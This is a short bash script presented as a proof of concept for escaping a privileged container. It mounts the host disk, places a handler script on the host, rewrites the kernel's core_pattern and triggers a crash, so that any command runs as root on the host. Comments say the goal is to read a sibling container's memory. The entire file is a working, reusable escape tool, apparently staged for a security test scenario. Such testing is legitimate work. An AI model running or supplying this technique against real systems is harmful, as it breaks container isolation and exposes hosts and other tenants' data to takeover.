#!/bin/bash
# hostexec.sh '<cmd>' — run <cmd> as root in the HOST pid namespace, print its output.
#
# Pre-staged PoC for the privileged scenario (offline-staged tier). Reading a sibling
# container's RAM needs code execution on the HOST, not just a host-disk mount. The only
# reliable primitive here (cgroup v2 -> no release_agent; no cron daemon) is core_pattern:
# the kernel runs a `|handler` core-dump handler in the host's INITIAL namespaces as root.
# The crucial, easy-to-get-wrong detail: that handler path is resolved on the HOST
# filesystem, so we place it there via the mounted host disk and point core_pattern at the
# HOST path (not a container path). Reusable: re-invoke to run a different command.
set -u

STAGE_HOST=/var/tmp/.thesis        # path as seen on the HOST (on-disk, not tmpfs)
MNT=/mnt/host                      # host root mounted here, inside the container
STAGE="$MNT$STAGE_HOST"            # same dir as seen from inside the container

[ $# -ge 1 ] || { echo "usage: hostexec.sh '<cmd>'" >&2; exit 2; }
CMD="$1"

# 1. Mount the host root filesystem (idempotent).
if [ ! -e "$MNT/etc/hostname" ]; then
  mkdir -p "$MNT"
  DEV=$(findmnt -n -o SOURCE --target /etc/hostname 2>/dev/null | sed 's/\[.*//')
  [ -b "$DEV" ] || DEV=/dev/vda1
  mount "$DEV" "$MNT" 2>/dev/null || { echo "hostexec: cannot mount host root ($DEV)" >&2; exit 1; }
fi

# 2. Stage a fixed handler + the command on the HOST fs. The handler runs cmd and captures
#    output; we overwrite only the cmd/out files on repeat calls.
mkdir -p "$STAGE"
cat > "$STAGE/handler" <<EOF
#!/bin/bash
{ /bin/bash "$STAGE_HOST/cmd"; } > "$STAGE_HOST/out" 2>&1
EOF
chmod +x "$STAGE/handler"
printf '%s\n' "$CMD" > "$STAGE/cmd"
: > "$STAGE/out"

# 3. Point the (global) kernel core_pattern at the HOST path of the handler.
echo "|$STAGE_HOST/handler" > /proc/sys/kernel/core_pattern || {
  echo "hostexec: cannot write core_pattern (need CAP_SYS_ADMIN)" >&2; exit 1; }

# 4. Trigger a core dump so the kernel pipes it to the handler (which runs host-side).
CRASH=/tmp/.thesis_crash
if [ ! -x "$CRASH" ]; then
  printf 'int main(){volatile int*p=0;return *p;}\n' | gcc -x c -o "$CRASH" - 2>/dev/null
fi
# Trailing `true` keeps the subshell from re-raising SIGSEGV (which would make the parent
# shell print a "Segmentation fault" job notice); the crash still dumps core to the handler.
if [ -x "$CRASH" ]; then
  ( ulimit -c unlimited; "$CRASH"; true ) >/dev/null 2>&1
else
  # Fallback with no compiler: a shell that SIGSEGVs itself still dumps core.
  ( ulimit -c unlimited; sh -c 'kill -SEGV $$'; true ) >/dev/null 2>&1
fi

# 5. Give the handler a moment, then return its output.
for _ in 1 2 3 4 5; do
  [ -s "$STAGE/out" ] && break
  sleep 0.4
done
cat "$STAGE/out" 2>/dev/null
